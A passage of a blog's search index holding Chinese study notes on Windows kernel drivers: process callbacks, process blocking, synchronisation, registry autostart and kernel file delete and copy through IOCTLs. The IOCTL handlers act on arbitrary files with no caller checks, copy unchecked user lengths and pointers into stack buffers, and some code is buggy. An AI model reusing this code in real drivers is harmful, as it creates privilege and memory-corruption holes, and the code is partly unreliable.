%wZ---PID: %d\\n&quot;, FullImageName, ProcessId);&#125;PsSetLoadImageNotifyRoutine(ImageRoutine);PsRemoveLoadImageNotifyRoutine(ImageRoutine); 其他的也很类似","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 7-进程同步","slug":"windows-kernel-driver-7-process-sync","date":"2024-03-21T02:00:52.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/21/windows-kernel-driver-7-process-sync/","link":"","permalink":"https://joe1sn.eu.org/2024/03/21/windows-kernel-driver-7-process-sync/","excerpt":"日常复习操作系统","text":"日常复习操作系统 同步方式 自旋锁，之前讲过了 信号量 互斥体 事件同步 事件同步 基于事件的同步，理解原理比写代码更重要 感觉上和R3的使用差不多 KeInitializeEvent(&amp;kEvent, NotificationEvent, FALSE); NotificationEvent：通知事件，手动处理，一般只用一次 SynchronizationEvent：同步事件，KeWaitForSingleObject等待通过，及不需要KeResetEvent，系统自动设置为未激发态 如果在R3使用Event传递Handle到R0，由于HANDLE不是全局，所以得ObReferenceObj 123456789101112131415161718192021222324252627282930VOID KThreadB(PVOID context) &#123; LARGE_INTEGER sleeptime = &#123; 0 &#125;; PKEVENT pevent = (PKEVENT)context; sleeptime.QuadPart = -100 * 10 * 1000 * 3; while (1) &#123; KeDelayExecutionThread(KernelMode, FALSE, &amp;sleeptime); DbgPrint(&quot;Traggering envet\\n&quot;); KeSetEvent(pevent, IO_NO_INCREMENT, FALSE); &#125; PsTerminateSystemThread(0);&#125;VOID KThreadA(PVOID context) &#123; UNREFERENCED_PARAMETER(context); KeInitializeEvent(&amp;kEvent, NotificationEvent, FALSE); HANDLE hThread = NULL; NTSTATUS status = PsCreateSystemThread(&amp;hThread, 0, NULL, NULL, NULL, KThreadB, (PVOID)&amp;kEvent); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Create System Thread Failed\\n&quot;); &#125; ZwClose(hThread); while (1) &#123; KeWaitForSingleObject(&amp;kEvent, Executive, KernelMode, FALSE, NULL); DbgPrint(&quot;Event Just Triggered\\n&quot;); KeResetEvent(&amp;kEvent); &#125; PsTerminateSystemThread(0);&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 6-链表与进程","slug":"windows-kernel-driver-6-memory","date":"2024-03-20T01:24:51.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/20/windows-kernel-driver-6-memory/","link":"","permalink":"https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/","excerpt":"感觉和之前学的bh文章有大量重复","text":"感觉和之前学的bh文章有大量重复 记录进程 123456typedef struct _Process &#123; LIST_ENTRY list; HANDLE pid; PEPROCESS pEprocessObj; char ProcessName[0x10];&#125; MyProcess, *pMyProcess; 两个extern需要声明 1234567891011121314151617181920212223242526NTKERNELAPI PUCHAR PsGetProcessImageFileName(PEPROCESS Process);NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS* Process);VOID ProcessNotify(HANDLE pid, HANDLE pid2, BOOLEAN value) &#123; UNREFERENCED_PARAMETER(pid); if (value) &#123; DbgPrint(&quot;Process Created %d\\n&quot;, pid2); PEPROCESS CurrentProc = NULL;//PsGetCurrentProcess(); PsLookupProcessByProcessId(pid2, &amp;CurrentProc); if (!CurrentProc) &#123; return; &#125; PUCHAR processname = PsGetProcessImageFileName(CurrentProc); DbgPrint(&quot;Process Name %s\\n&quot;, processname); &#125; return;&#125;....//驱动加载 LIST_ENTRY listhead = &#123; 0 &#125;; InitializeListHead(&amp;listhead); PsSetCreateProcessNotifyRoutine(ProcessNotify, FALSE);....//驱动卸载 PsSetCreateProcessNotifyRoutine(ProcessNotify, TRUE); 将获取到的链表进行链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172VOID ProcessNotify(HANDLE pid, HANDLE pid2, BOOLEAN value) &#123; UNREFERENCED_PARAMETER(pid); if (value) &#123; DbgPrint(&quot;Process Created %d\\n&quot;, pid2); PEPROCESS CurrentProc = NULL;//PsGetCurrentProcess(); PsLookupProcessByProcessId(pid2, &amp;CurrentProc); if (!CurrentProc) &#123; return; &#125; pMyProcess PMyProcess = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MyProcess),&#x27;cpym&#x27;); if (PMyProcess) &#123; RtlZeroMemory(PMyProcess, sizeof(MyProcess)); // init value PMyProcess-&gt;pid = pid2; PMyProcess-&gt;pEprocessObj = CurrentProc; PMyProcess-&gt;ProcessName = PsGetProcessImageFileName(CurrentProc); KIRQL irql = 0; KeAcquireSpinLock(&amp;kSpinLock, &amp;irql); InsertTailList(&amp;listhead, &amp;(PMyProcess-&gt;list)); KeReleaseSpinLock(&amp;kSpinLock, irql); &#125; PUCHAR processname = PsGetProcessImageFileName(CurrentProc); DbgPrint(&quot;Process Name %s\\n&quot;, processname); &#125; return;&#125;//....NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;// .... InitializeListHead(&amp;listhead); PsSetCreateProcessNotifyRoutine(ProcessNotify, FALSE); return Status;&#125;//...VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Driver Stopping -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DbgPrint(&quot;Device Stopping\\n&quot;); if (DriverObject-&gt;DeviceObject) &#123; IoDeleteDevice(DriverObject-&gt;DeviceObject); UNICODE_STRING symname = &#123; 0 &#125;; RtlInitUnicodeString(&amp;symname, SYM_NAME); IoDeleteSymbolicLink(&amp;symname); &#125; PsSetCreateProcessNotifyRoutine(ProcessNotify, TRUE); PLIST_ENTRY temp = NULL; pMyProcess tempMy = NULL; while (listhead.Blink != &amp;listhead) &#123; temp = RemoveTailList(&amp;listhead); tempMy = CONTAINING_RECORD(temp, MyProcess, list); DbgPrint(&quot;link -- name: %s -- pid: %d -- obj: %p\\n&quot;, tempMy-&gt;ProcessName, tempMy-&gt;pid, tempMy-&gt;pEprocessObj); ExFreePool(temp); &#125;&#125; 禁止程序执行 关于进程的遍历这里给出第二种方式，使用PsSetCreateProcessNotifyRoutineEx中使用PPS_CREATE_NOTIFY_INFO 这个API有一个很坑的地方就是必须在 链接器 中加上/INTEGRITYCHECK 回调函数 12345678910111213VOID MyBlockProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) &#123; //UNREFERENCED_PARAMETER(Process); //DbgPrint(&quot;ProcessCreated\\n&quot;); if (CreateInfo) &#123; CHAR Targetp[] = &quot;calc.exe&quot;; PCHAR ProcessName = (PCHAR)PsGetProcessImageFileName(Process); DbgPrint(&quot;now running: %s, pid: %d\\n&quot;, ProcessName, ProcessId); if (!strcmp(Targetp, ProcessName)) &#123; CreateInfo-&gt;CreationStatus = STATUS_UNSUCCESSFUL; &#125; &#125;&#125; 注册和释放 123PsSetCreateProcessNotifyRoutineEx(MyBlockProcessNotify, FALSE);PsSetCreateProcessNotifyRoutineEx(MyBlockProcessNotify, TRUE); 参考 https://cloud.tencent.com/developer/article/2195942 https://www.bilibili.com/video/BV1QJ411A7kR","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 5-中断级与自旋锁","slug":"windows-kernel-driver-5-thread-lock","date":"2024-03-19T03:40:30.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/19/windows-kernel-driver-5-thread-lock/","link":"","permalink":"https://joe1sn.eu.org/2024/03/19/windows-kernel-driver-5-thread-lock/","excerpt":"顺便复习操作系统了","text":"顺便复习操作系统了 WinOS 相关原理 中断级 如果有时间的话可以试着玩一玩这个游戏：https://github.com/plbrault/youre-the-os 在线：https://plbrault.github.io/youre-the-os/ 或许在游玩的过程中你会自己总结出一套操作系统进程调度的一套方法，便于其他方法的理解 调度方式：抢占式 最小执行单元：纤程-&gt;线程-&gt;进程 中断级( Irql ) 0-&gt;2级别越来越高，高级别可以打断低级别 0：Pass level 1：Apc level 2: Dpc level ISR延迟调用，硬件中断后，不那么紧急的任务放在DPC队列中 DPC访问换页内存，页面换到磁盘中pagefile.sys，引起换页缺页中断，如果换页中断无法打断DPC，然后就会访问无效地址，造成BSOD，所以DPC中最好不要使用换页内存，也即要使用nonpagedpool，而不要使用paged pool hardware(io…) 强制打断：ipicall 自旋锁 有一间厕所，A进去后就锁上了厕所的门。B和C的其他就只有在门外排队等待 应用场景： 操作危险数据：全局变量等（可以参考SQL） 可重入代码 编程相关 中断级 获取自身中断级别：KeGetCurrentIrql() 升级到DPC：KeRaiseIrqlToDpcLevel 降级：KeLowerIrql 123456DbgPrint(&quot;Current Irql %d\\nNow Try Raise to DPC\\n&quot;, KeGetCurrentIrql());KIRQL irql = KeGetCurrentIrql();irql = KeRaiseIrqlToDpcLevel();DbgPrint(&quot;After, Current Irql %d\\nNow Try decrease to Pass\\n&quot;, KeGetCurrentIrql());KeLowerIrql(irql);DbgPrint(&quot;End, Current Irql %d\\n&quot;, KeGetCurrentIrql()); 将线程保持在DPC会导致蓝屏 应用：希望函数在该线程执行中：1.不被中断，2：相关目标不被执行或者修改等 MSDN中有每个内核函数的中断级 创建DPC线程 12345678VOID DpcRoutineFunc() &#123; DbgPrint(&quot;Current Irql: %d\\n&quot;, KeGetCurrentIrql());&#125;.... DpcRoutineFunc(NULL); KDPC kDPC = &#123; 0 &#125;; KeInitializeDpc(&amp;kDPC, (PKDEFERRED_ROUTINE)DpcRoutineFunc, NULL); KeInsertQueueDpc(&amp;kDPC, NULL, NULL); DPC中调用ZwOpenFile之类的会BSOD 自旋锁 一般的自旋锁都是全局变量 123456KeInitializeSpinLock(&amp;kSpinLock);DbgPrint(&quot;SpinLock init\\n&quot;);KeAcquireSpinLock(&amp;kSpinLock, &amp;irql);DbgPrint(&quot;SpinLock Locked\\n&quot;);KeReleaseSpinLock(&amp;kSpinLock, irql);DbgPrint(&quot;SpinLock Delocked\\n&quot;); 加锁这个函数会会提升到DPC中，但是DPC不能访问可分页内存，例如Ring3下的PCB中的LDR 视频给出了一个技巧","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 4-内核注册表","slug":"windows-kernel-driver-4-reg","date":"2024-03-18T04:34:17.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/18/windows-kernel-driver-4-reg/","link":"","permalink":"https://joe1sn.eu.org/2024/03/18/windows-kernel-driver-4-reg/","excerpt":"使用内核注册表实现开机启动驱动等","text":"使用内核注册表实现开机启动驱动等 内核注册表 驱动创建描述符SYM_NAME后，会出现在注册表计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services中 启动项的名字为驱动的文件名，例如hevd_2 Start：2-开机自启动、3-手动启动、4-禁用，数字越小启动越早 打开注册表ZwCreateKey和ZwOpenKey 移动驱动启动位置并修改注册表 ZwCreateKey 12345678910111213141516171819NTSTATUS status = STATUS_SUCCESS;HANDLE hRegKey = NULL;OBJECT_ATTRIBUTES RegAttribute = &#123; 0 &#125;;ULONG KeyOp = 0;InitializeObjectAttributes(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);status = ZwCreateKey(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, 0, NULL, REG_OPTION_NON_VOLATILE, &amp;KeyOp);if (NT_SUCCESS(status)) &#123; if (KeyOp == REG_CREATED_NEW_KEY) &#123; DbgPrint(&quot;Create New key\\n&quot;); &#125; else if (KeyOp == REG_OPENED_EXISTING_KEY) &#123; DbgPrint(&quot;Registry key opened\\n&quot;); &#125; else &#123; DbgPrint(&quot;Error\\n&quot;); &#125;&#125; ZwOpenKey 1234567891011121314151617181920212223242526272829303132333435363738NTSTATUS KernelReg(PUNICODE_STRING RegistryPath) &#123; NTSTATUS status = STATUS_SUCCESS; HANDLE hRegKey = NULL; OBJECT_ATTRIBUTES RegAttribute = &#123; 0 &#125;; ULONG KeyOp = 0; PVOID KeyInfo = ExAllocatePool2(POOL_FLAG_NON_PAGED, 0x1000, &#x27;kcaH&#x27;); if (KeyInfo == NULL) &#123; DbgPrint(&quot;Allocate Mem Failed\\n&quot;); return status; &#125; RtlZeroMemory(KeyInfo, 0x1000); UNICODE_STRING regKeyName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;regKeyName, L&quot;ImagePath&quot;); InitializeObjectAttributes(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL); //status = ZwOpenKey(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, 0, NULL, REG_OPTION_NON_VOLATILE, &amp;KeyOp); status = ZwOpenKey(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Open Reg Key Failed\\n&quot;); return status; &#125; status = ZwQueryValueKey(hRegKey, &amp;regKeyName, KeyValuePartialInformation, KeyInfo, 0x1000 - 1, &amp;KeyOp); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Read Reg Key Failed\\n&quot;); ZwClose(hRegKey); ExFreePool(KeyInfo); return status; &#125; PKEY_VALUE_PARTIAL_INFORMATION tempinfo = (PKEY_VALUE_PARTIAL_INFORMATION)KeyInfo; PWCHAR tempName = (PWCHAR)(tempinfo-&gt;Data); DbgPrint(&quot;reg: %wZ, key: %wZ, Value: %ws\\n&quot;, RegistryPath,regKeyName, tempName); ZwClose(hRegKey); ExFreePool(KeyInfo); return status;&#125; 再加上ZwSetValue和之前的文件复制，就能实现这个功能了，但是需要更多的技巧来提升启动时的运行位置更早。 也可以使用微软封装函数RtlWriteRegistryValue","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 3-文件操作","slug":"windows-kernel-driver-3","date":"2024-03-17T08:51:33.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/03/17/windows-kernel-driver-3/","link":"","permalink":"https://joe1sn.eu.org/2024/03/17/windows-kernel-driver-3/","excerpt":"之前写过：windows内核驱动 1-环境搭建、windows内核驱动 2-页表探索 但是内容确实有点衔接不上，这里根据【Win Pwn】HEVD-内核栈溢出(上)中展示的基础技巧来继续","text":"之前写过：windows内核驱动 1-环境搭建、windows内核驱动 2-页表探索 但是内容确实有点衔接不上，这里根据【Win Pwn】HEVD-内核栈溢出(上)中展示的基础技巧来继续 项目结构优化 之前写过的所有功能都在main.c中，新加入IoctlFuncs，这里来写所有的ioctl功能，那么就要重新设计MyControl 1234567891011121314151617181920212223PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;ULONG ioInfo = 0;switch (ioCode)&#123;case IOCTL_MUL:&#123; DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Kernel Recive: %d, Len: %lld\\n&quot;, inData, inLen); inData *= 2; DbgPrint(&quot;Kernel Data %d\\n&quot;, inData); *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData; ioInfo = 4; break;&#125;default: RET = STATUS_UNSUCCESSFUL; ioInfo = 0; break;&#125; 这里分析得到我们需要的函数，大概可以声明为 1234567891011ULONG Mul(PIRP pIrp) &#123; PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength; DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Kernel Recive: %d, Len: %lld\\n&quot;, inData, inLen); inData *= 2; DbgPrint(&quot;Kernel Data %d\\n&quot;, inData); *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData; return (ULONG)inData; //return 4;&#125; 注意新建的文件要以.c结尾 文件操作 ZwXXXX -&gt; 系统检查 -&gt; NtXXXX R3下都一样 文件删除 使用到的API是 123NTSYSAPI NTSTATUS ZwDeleteFile( [in] POBJECT_ATTRIBUTES ObjectAttributes); 参数为 12345678typedef struct _OBJECT_ATTRIBUTES &#123; ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;&#125; OBJECT_ATTRIBUTES; 初始化改参数的api 1234567VOID InitializeObjectAttributes( [out] POBJECT_ATTRIBUTES p, [in] PUNICODE_STRING n, [in] ULONG a, [in] HANDLE r, [in, optional] PSECURITY_DESCRIPTOR s); 整个函数以及使用 12345678910111213141516171819202122NTSTATUS KernelDeleteFile(PWCHAR filePath) &#123; NTSTATUS status = STATUS_SUCCESS; UNICODE_STRING FilePath = &#123; 0 &#125;; RtlInitUnicodeString(&amp;FilePath, filePath); DbgPrint(&quot;[Kernel Delete File] The File Path is %wZ\\n&quot;, FilePath); OBJECT_ATTRIBUTES FileAttribute = &#123; 0 &#125;; InitializeObjectAttributes(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); status = ZwDeleteFile(&amp;FileAttribute); if (!NT_SUCCESS(status)) DbgPrint(&quot;Create Device Failed: %x\\n&quot;, status); return status;&#125;NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;//......... KernelDeleteFile(L&quot;\\\\??\\\\C:\\\\exp.exe&quot;); return Status;&#125; 文件复制 属于是把大象装进冰箱分几步 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576NTSTATUS KernelCopyFile(PWCHAR dstFile, PWCHAR srcFile) &#123; // 1-Declear Related Variable NTSTATUS status = STATUS_SUCCESS; UNICODE_STRING DstFilePath = &#123; 0 &#125;; UNICODE_STRING SrcFilePath = &#123; 0 &#125;; RtlInitUnicodeString(&amp;DstFilePath, dstFile); RtlInitUnicodeString(&amp;SrcFilePath, srcFile); IO_STATUS_BLOCK IoBlock = &#123; 0 &#125;; HANDLE hSrcFile = NULL; HANDLE hDstFile = NULL; //---------------------- // 2-Init Related Variable OBJECT_ATTRIBUTES DstFileAttribute = &#123; 0 &#125;; OBJECT_ATTRIBUTES SrcFileAttribute = &#123; 0 &#125;; InitializeObjectAttributes(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); InitializeObjectAttributes(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); // 3-Open File status = ZwOpenFile(&amp;hSrcFile, GENERIC_ALL, &amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Open File %wZ Failed, status: %x\\n&quot;, SrcFilePath, status); return status; &#125; // 4-Get Source File Size &amp; Allocate Transfer Buffer FILE_STANDARD_INFORMATION StdFileInfo = &#123; 0 &#125;; status = ZwQueryInformationFile(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Query File %wZ Failed, status: %x\\n&quot;, SrcFilePath, status); ZwClose(hSrcFile); return status; &#125; DbgPrint(&quot;IoBlock size %d\\n&quot;, IoBlock.Information); DbgPrint(&quot;StdFileInfo size %d\\n&quot;, StdFileInfo.EndOfFile.QuadPart); PVOID Transfer = ExAllocatePool2(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, &#x27;ymym&#x27;); if (Transfer == NULL) &#123; DbgPrint(&quot;ExAllocatePool Transfer Buffer Failed, status: %x\\n&quot;, status); ZwClose(hSrcFile); return status; &#125; RtlZeroMemory(Transfer, StdFileInfo.EndOfFile.QuadPart); // 5-Read Source File To Buffer LARGE_INTEGER TempReadCount = &#123; 0 &#125;; status = ZwReadFile(hSrcFile, NULL, NULL, NULL, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, NULL); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Read to Transfer Buffer Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); return status; &#125; DbgPrint(&quot;Io info: %d&quot;, IoBlock.Information); ZwClose(hSrcFile); // 6-Create New File status = ZwCreateFile(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Create File Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); return status; &#125; // 7-Write to New File status = ZwWriteFile(hDstFile, NULL, NULL, NULL, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, NULL); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Write File Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); ZwClose(hDstFile); return status; &#125; ZwClose(hDstFile); DbgPrint(&quot;Write %d\\n&quot;, IoBlock.Information); DbgPrint(&quot;Created New File %wZ\\n&quot;, DstFilePath); return status;&#125; 优化到IOCTL 文件删除 驱动 123456789101112131415161718192021222324NTSTATUS KernelDeleteFile(PIRP pIrp) &#123; NTSTATUS status = STATUS_SUCCESS; PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG filePathLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength; WCHAR filePath[0x1000] = &#123; 0 &#125;;// = pIrp-&gt;AssociatedIrp.SystemBuffer; if (filePathLen &gt;= 0x1000) &#123; DbgPrint(&quot;Size of file path is too big\\n&quot;); return status; &#125; UNICODE_STRING FilePath = &#123; 0 &#125;; RtlZeroMemory(filePath, 0x1000); RtlCopyMemory(filePath, pIrp-&gt;AssociatedIrp.SystemBuffer, filePathLen); RtlInitUnicodeString(&amp;FilePath, filePath); DbgPrint(&quot;Now Delete File %wZ\\n&quot;, FilePath); OBJECT_ATTRIBUTES FileAttribute = &#123; 0 &#125;; InitializeObjectAttributes(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); status = ZwDeleteFile(&amp;FileAttribute); if (!NT_SUCCESS(status)) DbgPrint(&quot;Delete Device Failed: %x\\n&quot;, status); return status;&#125; 客户端 1234567void KDeleteFile(HANDLE hDevice, const wchar_t filepath[]) &#123; DWORD info = 0; std::wstring prefix = L&quot;\\\\??\\\\&quot;; std::wstring r3path = filepath; r3path = prefix + r3path; DeviceIoControl(hDevice, IOCTL_DELETE_FILE, (LPVOID)r3path.c_str(), (r3path.size()) * 2 - 1, NULL, 0, &amp;info, NULL);&#125; 文件复制 驱动 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687NTSTATUS KernelCopyFile(PIRP pIrp) &#123; // 0-Get Param ParamKernelCopyFile Param = &#123; 0 &#125;; WCHAR dstFile[0x1000] = &#123; 0 &#125;; WCHAR srcFile[0x1000] = &#123; 0 &#125;; RtlZeroMemory(dstFile, 0x1000); RtlZeroMemory(srcFile, 0x1000); RtlCopyMemory((PVOID)&amp;Param, pIrp-&gt;AssociatedIrp.SystemBuffer, sizeof(ParamKernelCopyFile)); RtlCopyMemory((PVOID)dstFile, Param.dstFile, Param.dstFileLen); RtlCopyMemory((PVOID)srcFile, Param.srcFile, Param.srcFileLen); //DbgPrint(&quot;&quot;) // 1-Declear Related Variable NTSTATUS status = STATUS_SUCCESS; UNICODE_STRING DstFilePath = &#123; 0 &#125;; UNICODE_STRING SrcFilePath = &#123; 0 &#125;; RtlInitUnicodeString(&amp;DstFilePath, dstFile); RtlInitUnicodeString(&amp;SrcFilePath, srcFile); IO_STATUS_BLOCK IoBlock = &#123; 0 &#125;; HANDLE hSrcFile = NULL; HANDLE hDstFile = NULL; //---------------------- // 2-Init Related Variable OBJECT_ATTRIBUTES DstFileAttribute = &#123; 0 &#125;; OBJECT_ATTRIBUTES SrcFileAttribute = &#123; 0 &#125;; InitializeObjectAttributes(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); InitializeObjectAttributes(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL); // 3-Open File status = ZwOpenFile(&amp;hSrcFile, GENERIC_ALL, &amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Open File %wZ Failed, status: %x\\n&quot;, SrcFilePath, status); return status; &#125; // 4-Get Source File Size &amp; Allocate Transfer Buffer FILE_STANDARD_INFORMATION StdFileInfo = &#123; 0 &#125;; status = ZwQueryInformationFile(hSrcFile, &amp;IoBlock, &amp;StdFileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Query File %wZ Failed, status: %x\\n&quot;, SrcFilePath, status); ZwClose(hSrcFile); return status; &#125; PVOID Transfer = ExAllocatePool2(POOL_FLAG_NON_PAGED, StdFileInfo.EndOfFile.QuadPart, &#x27;ymym&#x27;); if (Transfer == NULL) &#123; DbgPrint(&quot;ExAllocatePool Transfer Buffer Failed, status: %x\\n&quot;, status); ZwClose(hSrcFile); return status; &#125; RtlZeroMemory(Transfer, StdFileInfo.EndOfFile.QuadPart); // 5-Read Source File To Buffer LARGE_INTEGER TempReadCount = &#123; 0 &#125;; status = ZwReadFile(hSrcFile, NULL, NULL, NULL, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, NULL); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Read to Transfer Buffer Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); return status; &#125; ZwClose(hSrcFile); // 6-Create New File status = ZwCreateFile(&amp;hDstFile, GENERIC_ALL, &amp;DstFileAttribute, &amp;IoBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Create File Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); return status; &#125; // 7-Write to New File status = ZwWriteFile(hDstFile, NULL, NULL, NULL, &amp;IoBlock, Transfer, (ULONG)StdFileInfo.EndOfFile.QuadPart, &amp;TempReadCount, NULL); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;Write File Failed, status: %x\\n&quot;, status); ExFreePool(Transfer); ZwClose(hDstFile); return status; &#125; ZwClose(hDstFile); DbgPrint(&quot;Created New File %wZ\\n&quot;, DstFilePath); return status;&#125; 客户端 12345678910111213141516171819void KCopyFile(HANDLE hDevice, const wchar_t srcpath[], const wchar_t dstpath[]) &#123; ParamKernelCopyFile param = &#123; 0 &#125;; DWORD info = 0; std::wstring prefix = L&quot;\\\\??\\\\&quot;; std::wstring SRC = srcpath; std::wstring DST = dstpath; SRC = prefix + SRC; DST = prefix + DST; param.dstFile = (PWCHAR)DST.c_str(); param.srcFile = (PWCHAR)SRC.c_str(); param.dstFileLen = DST.size() * 2 - 1; param.srcFileLen = SRC.size() * 2 - 1; std::wcout &lt;&lt; L&quot;SRC Path &quot; &lt;&lt; param.srcFile &lt;&lt; std::endl; std::wcout &lt;&lt; L&quot;DST Path &quot; &lt;&lt; param.dstFile &lt;&lt; std::endl; DeviceIoControl(hDevice, IOCTL_COPY_FILE, (LPVOID)&amp;param, sizeof(param), NULL, 0, &amp;info, NULL);&#125; 更好的文件复制 复制的时候使用内存大小，但是内核内存还是得节省着用，而且大文件可能会整数溢出 写个write的循环就行了 